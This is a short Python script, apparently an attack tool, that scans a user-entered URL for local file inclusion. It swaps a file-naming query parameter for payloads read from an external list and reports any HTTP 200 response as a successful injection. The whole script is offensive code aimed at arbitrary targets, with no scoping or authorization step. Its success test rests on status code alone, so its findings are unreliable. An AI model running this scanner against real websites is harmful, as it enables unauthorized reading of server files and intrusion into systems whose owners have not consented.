import requests
import re

extentionFile = open("extensions.txt", "r")
lfiPayloads = open("payloads.txt", "r", encoding='utf-8')


def testExtention(url):
    for extension in extentionFile:
        ext = re.compile(".*{}".format(extension.strip()))
        if ext.search(url):
            return True, extension
    return False, " "


def LFIinj(url, extension):
    successPayloads = []
    counter = 1
    for payload in lfiPayloads:
        newUrl = re.sub('=.*{}'.format(extension.strip()), '=', url)
        newUrl = newUrl + payload
        response = requests.get(newUrl.strip())
        if response.status_code == 200:
            # print this
            # responseList = response.text
            print("{} :[+] FOUNDED using : {}".format(counter, payload))
            counter = counter + 1
            choose = input("[?] Find another payload (yes or no)?")
            successPayloads.append(payload)
            if choose.lower() == "yes":
                continue
            else:
                break
        else:
            print("{} :[-] FAILED : {} ".format(counter, payload))
            counter = counter + 1
    return successPayloads


if __name__ == "__main__":
    url = input("Enter url to LFI: ")
    # test if url contain parameter with files extensions
    isHas, extention = testExtention(url)
    if isHas:
        print("URL querying file with extention {}".format(extention))
        print("Start LFI injection")
        successPayloads = LFIinj(url, extention)
    else:
        print("[-] Must be querying file from server ")

